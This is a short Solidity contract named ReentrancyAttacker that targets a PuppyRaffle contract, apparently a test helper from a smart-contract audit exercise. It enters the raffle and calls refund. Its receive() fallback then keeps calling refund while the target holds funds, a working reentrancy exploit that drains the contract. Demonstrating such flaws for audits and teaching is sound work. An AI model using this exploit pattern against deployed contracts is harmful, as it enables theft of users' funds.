//SPDX-License-Identifier: MIT;

pragma solidity ^0.7.6;

import {PuppyRaffle} from "../../src/PuppyRaffle.sol";


contract ReentrancyAttacker {
    PuppyRaffle target;
    uint256 playerIndex;

    constructor(address _target) payable {
        target = PuppyRaffle(_target);
    }
    
    function attack() public {
        address[] memory players = new address[](1);
        players[0] = address(this);
        target.enterRaffle{value: target.entranceFee()}(players);
        playerIndex = target.getActivePlayerIndex(address(this));
        target.refund(playerIndex);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.refund(playerIndex);
        }
    }
}